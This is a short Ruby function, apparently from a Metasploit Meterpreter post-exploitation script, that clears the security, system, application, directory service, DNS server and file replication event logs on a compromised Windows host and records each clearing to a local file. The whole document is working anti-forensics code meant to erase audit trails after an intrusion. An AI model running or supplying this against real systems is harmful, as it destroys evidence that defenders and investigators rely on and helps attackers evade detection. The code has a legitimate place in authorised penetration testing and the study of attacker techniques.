def clrevtlgs()
	evtlogs = [
		'security',
		'system',
		'application',
		'directory service',
		'dns server',
		'file replication service'
	]
	print_status("Clearing Event Logs, this will leave and event 517")
	begin
		evtlogs.each do |evl|
			print_status("\tClearing the #{evl} Event Log")
			log = @client.sys.eventlog.open(evl)
			log.clear
			file_local_write(@dest,"Cleared the #{evl} Event Log")
		end
		print_status("All Event Logs have been cleared")
	rescue ::Exception => e
		print_status("Error clearing Event Log: #{e.class} #{e}")

	end
end